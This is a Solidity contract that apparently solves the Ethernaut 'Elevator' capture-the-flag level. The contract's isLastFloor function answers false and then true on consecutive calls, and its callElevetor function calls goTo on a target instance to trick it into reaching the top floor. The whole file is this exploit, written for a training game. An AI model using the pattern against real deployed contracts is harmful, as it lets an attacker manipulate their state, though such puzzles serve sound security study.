// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract HackBuidling {
    Elevator public original = Elevator(0x0000); /// @dev update this with your instance address
    bool public flag = false;

    function isLastFloor(uint) public returns (bool) {
        // first call
        if (! flag) {
            flag = true;
            return false;
        // second call
        } else {
            flag = false;
            return true;
        }
    }

    function callElevetor() public {
        // call the elevator script with any int and the original contract will call this contract which will return true
        original.goTo(1);
    }
}